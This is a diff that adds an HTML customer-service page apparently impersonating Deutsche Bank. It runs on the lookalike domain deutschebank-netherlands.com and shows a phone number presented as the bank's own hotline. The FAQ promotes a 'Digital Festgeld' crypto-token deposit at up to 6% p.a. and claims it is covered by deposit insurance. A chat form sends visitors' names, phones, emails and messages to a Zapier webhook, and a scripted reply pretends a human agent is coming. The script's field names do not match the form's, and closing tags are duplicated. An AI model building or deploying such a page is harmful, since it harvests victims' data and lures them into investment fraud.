@@ -1,0 +1,626 @@
+
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kundenservice - Deutsche Bank</title>
+    <meta name="description" content="Servicio al cliente Deutsche Bank 24/7. Chat en vivo, soporte telefónico y asistencia para sus productos bancarios.">
+    
+    <!-- Open Graph / WhatsApp -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://deutschebank-netherlands.com/kundenservice.html">
+    <meta property="og:title" content="Deutsche Bank - Servicio al Cliente 24/7">
+    <meta property="og:description" content="¿Necesita ayuda? Nuestro equipo de atención al cliente está disponible las 24 horas.">
+    <meta property="og:image" content="https://deutschebank-netherlands.com/Dutch-Logo.png">
+    
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://deutschebank-netherlands.com/kundenservice.html">
+    <meta property="twitter:title" content="Deutsche Bank - Servicio al Cliente 24/7">
+    <meta property="twitter:description" content="¿Necesita ayuda? Nuestro equipo de atención al cliente está disponible las 24 horas.">
+    <meta property="twitter:image" content="https://deutschebank-netherlands.com/Dutch-Logo.png">
+
+    <!-- Google Fonts: Inter -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+
+        details>summary {
+            list-style: none;
+        }
+
+        details>summary::-webkit-details-marker {
+            display: none;
+        }
+    </style>
+</head>
+
+<body class="min-h-screen bg-white text-slate-900">
+
+    <!-- Header -->
+    <div class="bg-[#00008B] text-white py-4">
+        <div class="max-w-7xl mx-auto px-4">
+            <a href="index.html" class="flex items-center gap-3 hover:opacity-80 transition-opacity inline-flex">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Deutsche_Bank_logo_without_wordmark.svg/240px-Deutsche_Bank_logo_without_wordmark.svg.png"
+                    alt="Deutsche Bank Logo" class="w-10 h-10 bg-white p-1" />
+                <p class="text-lg font-semibold">Deutsche Bank</p>
+            </a>
+        </div>
+    </div>
+
+    <!-- Navigation -->
+    <nav class="bg-[#00008B] border-t border-white/10 sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-4">
+            <div class="flex flex-col md:flex-row justify-between items-center py-3 md:py-4 gap-3 md:gap-0">
+                <div class="flex justify-center items-center gap-4 md:gap-8 flex-1 flex-wrap">
+                    <a href="betrugsschutz.html"
+                        class="text-white hover:text-[#ffd000] transition-colors text-xs md:text-sm font-medium" data-i18n="nav_betrugsschutz">Betrugsschutz</a>
+                    <a href="kontakt.html"
+                        class="text-white hover:text-[#ffd000] transition-colors text-xs md:text-sm font-medium" data-i18n="nav_kontakt">Kontakt</a>
+                    <a href="filialen.html"
+                        class="text-white hover:text-[#ffd000] transition-colors text-xs md:text-sm font-medium" data-i18n="nav_filialen">Filialen</a>
+                    <a href="kundenservice.html"
+                        class="text-[#ffd000] transition-colors text-xs md:text-sm font-medium" data-i18n="nav_kundenservice">Kundenservice</a>
+                </div>
+
+                <!-- Language Switcher -->
+                <div class="relative ml-4" id="lang-switcher">
+                    <button type="button"
+                        class="flex items-center gap-2 bg-white/10 hover:bg-white/20 border border-white/20 text-white rounded-md px-3 py-2 text-xs md:text-sm transition-colors"
+                        id="lang-btn">
+                        <svg class="w-4 h-4 text-white/70" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <line x1="2" y1="12" x2="22" y2="12"></line>
+                            <path
+                                d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z">
+                            </path>
+                        </svg>
+                        <span id="current-lang">Deutsch</span>
+                        <svg class="w-4 h-4 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7">
+                            </path>
+                        </svg>
+                    </button>
+
+                    <!-- Dropdown Menu -->
+                    <div class="absolute right-0 mt-2 w-40 bg-[#00008B] border border-white/10 rounded-md shadow-lg hidden z-50 py-1"
+                        id="lang-menu">
+                        <a href="#" class="block px-4 py-2 text-sm text-white hover:bg-white/10 flex items-center gap-2"
+                            onclick="selectLang('Deutsch', 'de')"><span>🇩🇪</span> <span data-i18n="lang_deutsch">Deutsch</span></a>
+                        <a href="#" class="block px-4 py-2 text-sm text-white hover:bg-white/10 flex items-center gap-2"
+                            onclick="selectLang('English', 'en')"><span>🇬🇧</span> <span data-i18n="lang_english">English</span></a>
+                        <a href="#" class="block px-4 py-2 text-sm text-white hover:bg-white/10 flex items-center gap-2"
+                            onclick="selectLang('Français', 'fr')"><span>🇫🇷</span> <span data-i18n="lang_francais">Français</span></a>
+                        <a href="#" class="block px-4 py-2 text-sm text-white hover:bg-white/10 flex items-center gap-2"
+                            onclick="selectLang('Español', 'es')"><span>🇪🇸</span> <span data-i18n="lang_espanol">Español</span></a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero -->
+    <div class="bg-gradient-to-br from-[#00008B] via-[#0000CD] to-[#00008B] text-white py-24">
+        <div class="max-w-7xl mx-auto px-4">
+            <div class="text-center max-w-3xl mx-auto">
+                <h1 class="text-5xl md:text-6xl font-light mb-6">
+                    Kundenservice
+                </h1>
+                <p class="text-xl text-white/90 leading-relaxed font-light">
+                    Wir sind für Sie da. Finden Sie Antworten auf Ihre Fragen oder kontaktieren Sie uns direkt.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Service Options -->
+    <div class="max-w-7xl mx-auto px-4 py-20">
+        <div class="text-center mb-16">
+            <h2 class="text-4xl font-light text-[#00008B] mb-4">Kontaktieren Sie uns</h2>
+            <p class="text-gray-600 text-lg">Wählen Sie den für Sie besten Weg</p>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-20">
+            <!-- Phone -->
+            <div
+                class="group bg-white border border-gray-100 rounded-xl p-8 hover:shadow-2xl hover:border-[#00008B]/30 transition-all duration-300 text-center">
+                <div
+                    class="w-16 h-16 bg-[#00008B] rounded-xl flex items-center justify-center mx-auto mb-6 group-hover:scale-110 transition-transform duration-300">
+                    <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                            d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z">
+                        </path>
+                    </svg>
+                </div>
+                <h3 class="text-lg font-semibold text-[#00008B] mb-2">Telefon-Hotline</h3>
+                <p class="text-sm text-gray-600 mb-4">24/7 erreichbar</p>
+                <p class="text-sm font-semibold text-gray-900 mb-6">+49 30 544 480 512</p>
+                <a href="tel:+4930544480512"
+                    class="block w-full bg-[#00008B] hover:bg-[#0000CD] text-white py-3 rounded-xl transition-all font-medium">Jetzt
+                    anrufen</a>
+            </div>
+
+            <!-- Email -->
+            <div
+                class="group bg-white border border-gray-100 rounded-xl p-8 hover:shadow-2xl hover:border-[#00008B]/30 transition-all duration-300 text-center">
+                <div
+                    class="w-16 h-16 bg-[#00008B] rounded-xl flex items-center justify-center mx-auto mb-6 group-hover:scale-110 transition-transform duration-300">
+                    <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                            d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z">
+                        </path>
+                    </svg>
+                </div>
+                <h3 class="text-lg font-semibold text-[#00008B] mb-2">E-Mail Support</h3>
+                <p class="text-sm text-gray-600 mb-4">Antwort innerhalb 24h</p>
+                <p class="text-sm font-semibold text-gray-900 mb-6">info@deutschebank.de</p>
+                <a href="mailto:info@deutschebank.de"
+                    class="block w-full bg-[#00008B] hover:bg-[#0000CD] text-white py-3 rounded-xl transition-all font-medium">E-Mail
+                    senden</a>
+            </div>
+
+            <!-- Chat -->
+            <div
+                class="group bg-white border border-gray-100 rounded-xl p-8 hover:shadow-2xl hover:border-[#00008B]/30 transition-all duration-300 text-center">
+                <div
+                    class="w-16 h-16 bg-[#00008B] rounded-xl flex items-center justify-center mx-auto mb-6 group-hover:scale-110 transition-transform duration-300">
+                    <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                            d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z">
+                        </path>
+                    </svg>
+                </div>
+                <h3 class="text-lg font-semibold text-[#00008B] mb-2">Live Chat</h3>
+                <p class="text-sm text-gray-600 mb-4">Mo-Fr 8:00 - 20:00</p>
+                <p class="text-sm font-semibold text-gray-900 mb-6">Chatten Sie mit einem Berater</p>
+                <button id="open-chat-btn"
+                    class="w-full bg-[#00008B] hover:bg-[#0000CD] text-white py-3 rounded-xl transition-all font-medium">Chat
+                    starten</button>
+            </div>
+
+            <!-- Docs -->
+            <div
+                class="group bg-white border border-gray-100 rounded-xl p-8 hover:shadow-2xl hover:border-[#00008B]/30 transition-all duration-300 text-center">
+                <div
+                    class="w-16 h-16 bg-[#00008B] rounded-xl flex items-center justify-center mx-auto mb-6 group-hover:scale-110 transition-transform duration-300">
+                    <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                            d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z">
+                        </path>
+                    </svg>
+                </div>
+                <h3 class="text-lg font-semibold text-[#00008B] mb-2">Dokumente</h3>
+                <p class="text-sm text-gray-600 mb-4">Alle wichtigen Formulare</p>
+                <p class="text-sm font-semibold text-gray-900 mb-6">Download Center</p>
+                <button
+                    class="w-full bg-[#00008B] hover:bg-[#0000CD] text-white py-3 rounded-xl transition-all font-medium">Zu
+                    den Dokumenten</button>
+            </div>
+        </div>
+
+        <!-- Branch Info -->
+        <div class="bg-gray-50 border border-gray-200 rounded-2xl p-12 mb-20 shadow-sm">
+            <div class="grid md:grid-cols-2 gap-12">
+                <div>
+                    <h3 class="text-2xl font-light text-[#00008B] mb-6">Hauptsitz</h3>
+                    <div class="space-y-4 text-gray-700">
+                        <p class="flex items-start gap-4"><span
+                                class="font-semibold min-w-[100px] text-[#00008B]">Adresse:</span><span>Unter den Linden
+                                13-15, 10117 Berlin, Deutschland</span></p>
+                        <p class="flex items-start gap-4"><span
+                                class="font-semibold min-w-[100px] text-[#00008B]">Telefon:</span><span>+49 30 544 480
+                                512</span></p>
+                        <p class="flex items-start gap-4"><span
+                                class="font-semibold min-w-[100px] text-[#00008B]">E-Mail:</span><span>info@deutschebank.de</span>
+                        </p>
+                    </div>
+                </div>
+                <div>
+                    <h4 class="text-xl font-light text-[#00008B] mb-6">Öffnungszeiten</h4>
+                    <div class="space-y-3 text-gray-700">
+                        <p class="flex justify-between border-b border-gray-200 pb-2"><span class="font-medium">Montag -
+                                Freitag:</span><span>9:00 - 18:00</span></p>
+                        <p class="flex justify-between border-b border-gray-200 pb-2"><span
+                                class="font-medium">Samstag:</span><span>10:00 - 14:00</span></p>
+                        <p class="flex justify-between"><span class="font-medium">Sonntag:</span><span
+                                class="text-red-600 font-semibold uppercase tracking-wider text-xs">Geschlossen</span>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Emergency Hotline Banner -->
+        <div class="bg-red-50 border border-red-100 rounded-2xl p-8 mb-20">
+            <div class="flex flex-col md:flex-row items-center gap-6">
+                <div
+                    class="w-16 h-16 bg-red-600 rounded-full flex items-center justify-center flex-shrink-0 animate-pulse">
+                    <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                            d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z">
+                        </path>
+                    </svg>
+                </div>
+                <div class="flex-1 text-center md:text-left">
+                    <h3 class="text-2xl font-semibold text-red-900 mb-2">Kartensperre & Notfall</h3>
+                    <p class="text-red-800">Sperren Sie Ihre Karte sofort bei Verlust oder Diebstahl - 24 Stunden am
+                        Tag.</p>
+                </div>
+                <div class="flex flex-col sm:flex-row gap-4">
+                    <a href="tel:+4930544480512"
+                        class="bg-red-600 hover:bg-red-700 text-white px-8 py-4 rounded-xl font-bold shadow-lg shadow-red-200 transition-all text-center">
+                        +49 30 544 480 512
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <!-- FAQ -->
+        <div class="mb-20">
+            <div class="text-center mb-12">
+                <h2 class="text-4xl font-light text-[#00008B] mb-4">Häufig gestellte Fragen</h2>
+                <p class="text-gray-600 text-lg">Finden Sie schnelle Antworten auf die wichtigsten Fragen.</p>
+            </div>
+
+            <div class="max-w-4xl mx-auto space-y-4">
+                <details
+                    class="group bg-white border border-gray-200 rounded-xl px-6 open:border-[#00008B] transition-all duration-300">
+                    <summary class="flex justify-between items-center font-semibold text-[#00008B] py-5 cursor-pointer">
+                        <span>Wie eröffne ich ein Konto?</span>
+                        <svg class="w-5 h-5 text-gray-400 group-open:rotate-180 transition-transform" fill="none"
+                            stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7">
+                            </path>
+                        </svg>
+                    </summary>
+                    <div class="text-gray-600 pb-6 text-sm leading-relaxed">
+                        Die Kontoeröffnung erfolgt vollständig digital über unsere Webseite oder App. Sie benötigen
+                        lediglich Ihren Personalausweis oder Reisepass für die Identitätsprüfung per Video-Ident. Der
+                        Prozess dauert in der Regel weniger als 10 Minuten.
+                    </div>
+                </details>
+                <details
+                    class="group bg-white border border-gray-200 rounded-xl px-6 open:border-[#00008B] transition-all duration-300">
+                    <summary class="flex justify-between items-center font-semibold text-[#00008B] py-5 cursor-pointer">
+                        <span>Welche Dokumente werden benötigt?</span>
+                        <svg class="w-5 h-5 text-gray-400 group-open:rotate-180 transition-transform" fill="none"
+                            stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7">
+                            </path>
+                        </svg>
+                    </summary>
+                    <div class="text-gray-600 pb-6 text-sm leading-relaxed">
+                        Für die Eröffnung eines Privatkontos benötigen Sie lediglich einen gültigen Personalausweis oder
+                        Reisepass. Bei Nicht-EU-Bürgern ist gegebenenfalls ein gültiger Aufenthaltstitel erforderlich.
+                        Weitere Dokumente sind für Basiskonten meist nicht notwendig.
+                    </div>
+                </details>
+                <details
+                    class="group bg-white border border-gray-200 rounded-xl px-6 open:border-[#00008B] transition-all duration-300">
+                    <summary class="flex justify-between items-center font-semibold text-[#00008B] py-5 cursor-pointer">
+                        <span>Ist mein Geld bei der Deutschen Bank sicher?</span>
+                        <svg class="w-5 h-5 text-gray-400 group-open:rotate-180 transition-transform" fill="none"
+                            stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7">
+                            </path>
+                        </svg>
+                    </summary>
+                    <div class="text-gray-600 pb-6 text-sm leading-relaxed">
+                        Ja, absolut. Als führendes deutsches Kreditinstitut unterliegen wir der gesetzlichen
+                        Einlagensicherung sowie dem Einlagensicherungsfonds des Bundesverbandes deutscher Banken.
+                        Einlagen sind bis zu 100.000 € pro Kunde rechtlich geschützt.
+                    </div>
+                </details>
+                <details
+                    class="group bg-white border border-gray-200 rounded-xl px-6 open:border-[#00008B] transition-all duration-300">
+                    <summary class="flex justify-between items-center font-semibold text-[#00008B] py-5 cursor-pointer">
+                        <span>Was ist das Digital Festgeld?</span>
+                        <svg class="w-5 h-5 text-gray-400 group-open:rotate-180 transition-transform" fill="none"
+                            stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7">
+                            </path>
+                        </svg>
+                    </summary>
+                    <div class="text-gray-600 pb-6 text-sm leading-relaxed">
+                        Das Digital Festgeld ist ein innovatives Anlageprodukt, das es Ihnen ermöglicht, Kapital in
+                        hochsicheren digitalen Verrechnungseinheiten (EURC/EURAU) anzulegen. Sie profitieren von
+                        marktführenden Zinsen bis zu 6% p.a. bei gleichzeitigem Schutz durch den
+                        Einlagensicherungsfonds.
+                    </div>
+                </details>
+            </div>
+        </div>
+    </div>
+
+    <!-- Chat Dialog -->
+    <div id="chat-dialog" class="fixed inset-0 z-50 hidden" aria-labelledby="chat-title" role="dialog"
+        aria-modal="true">
+        <div class="fixed inset-0 bg-[#00008B]/20 backdrop-blur-sm transition-opacity" id="chat-backdrop"></div>
+        <div class="fixed inset-0 z-10 w-screen overflow-y-auto">
+            <div class="flex min-h-full items-center justify-center p-4">
+                <div
+                    class="relative transform overflow-hidden rounded-xl bg-white text-left shadow-2xl transition-all w-full max-w-lg h-[600px] flex flex-col p-0">
+
+                    <!-- Header -->
+                    <div class="px-6 py-4 border-b bg-[#00008B] text-white rounded-t-lg">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-3">
+                                <div class="w-10 h-10 bg-white/20 rounded-full flex items-center justify-center">
+                                    <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor"
+                                        viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                            d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z">
+                                        </path>
+                                    </svg>
+                                </div>
+                                <div>
+                                    <h3 class="text-lg font-semibold text-white" id="chat-title">Chat starten</h3>
+                                    <p class="text-xs text-white/80">Deutsche Bank</p>
+                                </div>
+                            </div>
+                            <button type="button" id="close-chat-btn"
+                                class="text-white/80 hover:text-white transition-colors">
+                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                        d="M6 18L18 6M6 6l12 12"></path>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Messages Area -->
+                    <div id="chat-messages" class="flex-1 overflow-y-auto px-6 py-4 space-y-4 bg-gray-50">
+                    </div>
+
+                    <!-- Form Step -->
+                    <div id="chat-form-step" class="p-6 border-t bg-white space-y-3">
+                        <form id="chat-init-form" action="https://hooks.zapier.com/hooks/catch/26345831/ue2jdsl/" method="POST" class="space-y-3">
+                            <input type="hidden" name="datum" id="datum-field">
+                            <input type="hidden" name="page" value="kundenservice">
+                            <input type="text" name="vorname" required data-i18n="chat_placeholder_name" placeholder="Ihr vollständiger Name"
+                                class="w-full border-gray-300 rounded-md px-3 py-2 text-sm focus:ring-1 focus:ring-[#00008B] focus:border-[#00008B] outline-none border transition-all">
+                            <input type="tel" name="telefon" data-i18n="chat_placeholder_phone" placeholder="+49..."
+                                class="w-full border-gray-300 rounded-md px-3 py-2 text-sm focus:ring-1 focus:ring-[#00008B] focus:border-[#00008B] outline-none border transition-all">
+                            <input type="email" name="email" required data-i18n="chat_placeholder_email" placeholder="ihre.email@beispiel.com"
+                                class="w-full border-gray-300 rounded-md px-3 py-2 text-sm focus:ring-1 focus:ring-[#00008B] focus:border-[#00008B] outline-none border transition-all">
+                            <textarea name="nachricht" data-i18n="chat_placeholder_message" placeholder="Wie können wir Ihnen helfen?"
+                                class="w-full border-gray-300 rounded-md px-3 py-2 text-sm focus:ring-1 focus:ring-[#00008B] focus:border-[#00008B] outline-none border transition-all h-20"></textarea>
+                            <button type="submit"
+                                class="w-full bg-[#00008B] hover:bg-[#0000CD] text-white py-2 rounded-md font-semibold transition-all" data-i18n="chat_btn_send">
+                                Anfrage senden
+                            </button>
+                        </form>
+                    </div>
+
+                    <!-- Chat Input Step (Hidden initially) -->
+                    <div id="chat-input-step" class="hidden p-4 border-t bg-white">
+                        <div class="flex gap-2">
+                            <input type="text" id="chat-input-field" data-i18n="chat_placeholder_chat" placeholder="Nachricht eingeben..."
+                                class="flex-1 border-gray-300 rounded-md px-3 py-2 text-sm focus:ring-1 focus:ring-[#00008B] focus:border-[#00008B] outline-none border transition-all">
+                            <button id="send-msg-btn"
+                                class="bg-[#00008B] hover:bg-[#0000CD] text-white p-2 rounded-md transition-all active:scale-95">
+                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                        d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"></path>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="bg-[#00008B] text-white py-12 border-t border-white/10">
+        <div class="max-w-7xl mx-auto px-4">
+            <div class="flex flex-col md:flex-row justify-between items-center gap-8">
+                <div class="flex items-center gap-3">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Deutsche_Bank_logo_without_wordmark.svg/240px-Deutsche_Bank_logo_without_wordmark.svg.png"
+                        alt="Logo" class="w-8 h-8 bg-white p-1">
+                    <p class="font-semibold">Deutsche Bank</p>
+                </div>
+                <div class="flex gap-6 text-sm text-white/60">
+                    <a href="index.html" class="hover:text-white">Home</a>
+                    <a href="betrugsschutz.html" class="hover:text-white">Betrugsschutz</a>
+                    <a href="digital-festgeld.html" class="hover:text-white">Digital Festgeld</a>
+                    <a href="kontakt.html" class="hover:text-white">Kontakt</a>
+                    <a href="filialen.html" class="hover:text-white">Filialen</a>
+                </div>
+            </div>
+            <div class="mt-8 pt-8 border-t border-white/10 text-center text-xs text-white/40">
+                <p>© 2026 Deutsche Bank AG. Alle Rechte vorbehalten.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            // Language switcher
+            const langBtn = document.getElementById('lang-btn');
+            const langMenu = document.getElementById('lang-menu');
+            const currentLangLabel = document.getElementById('current-lang');
+
+            if (langBtn && langMenu) {
+                langBtn.addEventListener('click', (e) => {
+                    e.stopPropagation();
+                    langMenu.classList.toggle('hidden');
+                });
+
+                document.addEventListener('click', (e) => {
+                    if (!langBtn.contains(e.target) && !langMenu.contains(e.target)) {
+                        langMenu.classList.add('hidden');
+                    }
+                });
+            }
+
+            window.selectLang = (label, code) => {
+                if (currentLangLabel) currentLangLabel.innerText = label;
+                langMenu.classList.add('hidden');
+                console.log(`Language changed to: ${label} (${code})`);
+            };
+
+            const modal = document.getElementById('chat-dialog');
+            const openBtn = document.getElementById('open-chat-btn');
+            const closeBtn = document.getElementById('close-chat-btn');
+            const backdrop = document.getElementById('chat-backdrop');
+            const formStep = document.getElementById('chat-form-step');
+            const inputStep = document.getElementById('chat-input-step');
+            const messagesArea = document.getElementById('chat-messages');
+            const chatForm = document.getElementById('chat-init-form');
+            const inputField = document.getElementById('chat-input-field');
+            const sendBtn = document.getElementById('send-msg-btn');
+
+            let messages = [];
+
+            function renderMessages() {
+                messagesArea.innerHTML = messages.map(msg => `
+                <div class="flex ${msg.type === 'user' ? 'justify-end' : 'justify-start'} animate-in fade-in slide-in-from-bottom-2 duration-300">
+                    <div class="max-w-[80%] rounded-lg px-4 py-2 ${msg.type === 'user' ? 'bg-[#00008B] text-white' : 'bg-white border border-gray-200 text-gray-800 shadow-sm'}">
+                        <p class="text-sm leading-relaxed whitespace-pre-line">${msg.text}</p>
+                        <p class="text-[10px] mt-1 ${msg.type === 'user' ? 'text-white/70 text-right' : 'text-gray-400'}">${msg.time}</p>
+                    </div>
+                </div>
+            `).join('');
+                messagesArea.scrollTop = messagesArea.scrollHeight;
+            }
+
+            function addMessage(text, type = 'system') {
+                const now = new Date();
+                messages.push({
+                    text,
+                    type,
+                    time: now.toLocaleTimeString('de-DE', { hour: '2-digit', minute: '2-digit' })
+                });
+                renderMessages();
+            }
+
+            function openModal() {
+                modal.classList.remove('hidden');
+                if (messages.length === 0) {
+                    addMessage('Willkommen beim Deutsche Bank Kundenservice. Bitte füllen Sie das Formular aus, um zu beginnen.');
+                }
+            }
+
+            function closeModal() {
+                modal.classList.add('hidden');
+                // Reset states if desired or keep them contextually
+            }
+
+            openBtn?.addEventListener('click', openModal);
+            closeBtn?.addEventListener('click', closeModal);
+            backdrop?.addEventListener('click', closeModal);
+
+            chatForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                const formData = new FormData(chatForm);
+                const nombre = formData.get('nombre');
+                const email = formData.get('email');
+                const telefono = formData.get('telefono');
+                const observacion = formData.get('observacion');
+
+                // User message summary
+                let userMsg = `Name: ${nombre}\nEmail: ${email}`;
+                if (telefono) userMsg += `\nTelefon: ${telefono}`;
+                if (observacion) userMsg += `\nBemerkung: ${observacion}`;
+
+                addMessage(userMsg, 'user');
+                formStep.classList.add('hidden');
+                inputStep.classList.remove('hidden');
+
+                // Send to Formspree and Zapier
+                const submitBtn = chatForm.querySelector('button[type="submit"]');
+                submitBtn.innerHTML = 'Wird gesendet...';
+                submitBtn.disabled = true;
+
+                fetch(chatForm.action, {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                })
+                .then(response => {
+                    if (response.ok) {
+                        // Also send to Zapier webhook
+                        const zapierWebhook = 'https://hooks.zapier.com/hooks/catch/26345831/ue2jdsl/';
+                        const zapierData = {
+                            nombre: nombre,
+                            email: email,
+                            telefono: telefono,
+                            observacion: observacion,
+                            datum: new Date().toISOString()
+                        };
+                        
+                        fetch(zapierWebhook, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(zapierData)
+                        }).catch(err => console.log('Zapier error:', err));
+                    }
+                })
+                .catch(err => console.log('Formspree error:', err));
+
+                // System simulation
+                setTimeout(() => {
+                    addMessage('Einen Moment bitte, um Ihre Anfrage einem menschlichen Mitarbeiter zuzuweisen...');
+                }, 1500);
+
+                setTimeout(() => {
+                    addMessage('Ich werde Ihre Anfrage an den ersten verfügbaren Mitarbeiter weiterleiten, der sich so schnell wie möglich um Ihre Anfrage kümmern wird.');
+                }, 4000);
+            });
+
+            function sendMessage() {
+                const txt = inputField.value.trim();
+                if (!txt) return;
+                addMessage(txt, 'user');
+                inputField.value = '';
+            }
+
+            sendBtn.addEventListener('click', sendMessage);
+            inputField.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') sendMessage();
+            });
+        });
+    </script>
+
+    <script src="assets/js/translations.js"></script>
+
+    <script>
+        // Auto-fill datum field
+        document.getElementById('chat-init-form').addEventListener('submit', function() {
+            document.getElementById('datum-field').value = new Date().toISOString();
+        });
+    </script>
+
+</body>
+
+</html>
+
+
+</body>
+
+</html>
